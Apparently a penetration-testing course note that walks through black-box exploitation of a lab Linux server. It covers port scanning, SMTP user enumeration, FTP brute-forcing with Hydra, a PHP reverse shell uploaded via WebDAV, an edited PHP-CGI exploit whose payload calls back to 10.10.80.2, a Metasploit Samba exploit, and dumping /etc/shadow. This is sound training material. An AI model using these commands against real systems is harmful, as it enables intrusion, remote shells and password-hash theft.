# 8 - Linux Blackbox Exploitation

## <mark style="color:red;">Linux Black Box Penetration Test</mark>

### **Black Box Pentest**

* A Black box penetration test is a security assessment whereby the penetration tester is not provided with any information regarding the target system or network (No IP ranges, system information or default credentials are provided).
* The objective of a Black box penetration test is to accurately test the security of a system or network as an external unprivileged adversary.
* This approach is very useful as it demonstrates how an external attacker with no inside knowledge would compromise a company's systems or networks.

### **Penetration Testing Phases**

* The following diagram outlines the various phases involved in a typical penetration test.

### **Black Box Methodology:**

* Host discovery
* Port scanning & enumeration
* Vulnerability detection/scanning
* Exploitation
* Manual
* Automated
* Post Exploitation
* Privilege Escalation
* Persistence
* Dumping Hashes

### **Scenario & Scope**

* You have just begun your first job as a Junior Penetration Tester and have been assigned to assist in performing a penetration test on a client's network.
* The pentest lead was pleased with your ability to gain access to the Windows Server target and has assigned you to perform a pentest on a Linux server on the client's network.
* Your primary objectives are:
  * Identify services running on the target
  * Identify vulnerabilities within the services
  * Exploit these vulnerabilities to obtain an initial foothold.



## Practical Demonstration

#### <mark style="color:yellow;">Black Box Port Scanning & Enumeration</mark>

{% code overflow="wrap" lineNumbers="true" %}
```bash
cat /etc/hosts # identify target ip addr, ping for connectivity.
nmap -sV -p1-10000 $ip -oN nmap_10k.txt # scan target.
nc -nv $ip <port> # banner grabbing ports/services nmap was unable to identify.
# in the process we were able to connect to a bind shell listener on the target on port 1524. Always perform banner grabbing with nc.
root@24wfww> ls
cat /etc/*release # distribution version.
cd /home # view users.

```
{% endcode %}

#### <mark style="color:yellow;">1 - Targeting vsftpd</mark>

{% code overflow="wrap" lineNumbers="true" %}
```bash
# anonymous access worked.
# searchsploit vsftpd, we tried running the exploit module, but didn't work. the backdoor was disabled by the admin (port 6200 was closed).

# another way is to perform bruteforce.
# an easy way is to exploit SMTP, which is an easy way of discovering user accts in a target PC, which can help us narrow down out bruteforce attack.

# lets do a bruteforce on SMTP and identify user accts using Metasploit.
search smtp_enum
use 0, you can modify the user wordlist, set RHOSTS, run
# we can utiize the list and narrow our bruteforce for other service like FTP.

# FTP bruteforce
hydra -l service -P ...unix_users.txt $ip ftp # we get a password.
ftp $ip 21 # login to ftp.
cd / # go to the root and look around. 

# we can now look at the WebDAV, to upload a php file and gain reverse shell.
ls /usr/share/webshells/php/php-reverse-shell.php # we can use the imbuilt php reverse shell in kali, copy it, modify it and upload to the host.
nano php-rev-shell.php # modify it.

nc -nvlp 1234 # setup a nc listener

# login to ftp.
# we can cd to the dav directory to upload the payload.
cd /var/www/dav
put php-shell.php
# refresh the browser, then run the payload, we receive a borne shell sessio on our listener.
/bin/bash -i # get a bash shell.
whoami
ls
cd /var/www
ls # now we have access to the www dir, as opposed to when we were using ftp access.
```
{% endcode %}

#### <mark style="color:yellow;">2 - Targeting PHP</mark>

{% code overflow="wrap" lineNumbers="true" %}
```bash
# get target ip.
nmap -sV -sC -p80 $ip 
$ip # view webpage in the browser.

$ip/phpinfo.php # view the php version.
searchsploit php cgi # search got exploit. php versions lower than 5.3.12 are vulnerable to the "CGI Argument Injection".

# we will use mannual method to exploit this vuln.
searchsploit -m <exploitID> # to copy over the exploit script to current dir.
searchsploit -m 18836
nano 18836.py # view.
# replace the php code in the cgi_exploit function with a php one liner reverse shell code. Goto revshells.com to generate the code. Save and execute the script. if it dosent work, you might want to change the "descriptors" values from 3 to 4. We now have access to the "www-data" user.

pwn_code = """<?php  $sock=fsockopen("10.10.80.2",1234);exec("/bin/sh -i <&4 >&4 2>&4");?>"""

cat /etc/*release # distribution version.
```
{% endcode %}

#### <mark style="color:yellow;">3 - Targeting Samba</mark>

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -sV -p445 $ip

# using Metasploit to get the actual Samba version.
search smb_version
use 0, run # gives us the samba version.

searchsploit samba 3.0.20 # use 
use explit/multi/samba/usermap_script
exploit # we get a cmd reverse shell.
ls -al
cat /etc/*issue
cat /etc/*release
ctrl+z
sessions -u 1 # upgrade to a meterpreter session.
# and also root access.
cat /etc/passwd
cat /etc/shadow # dump hashes.
```
{% endcode %}



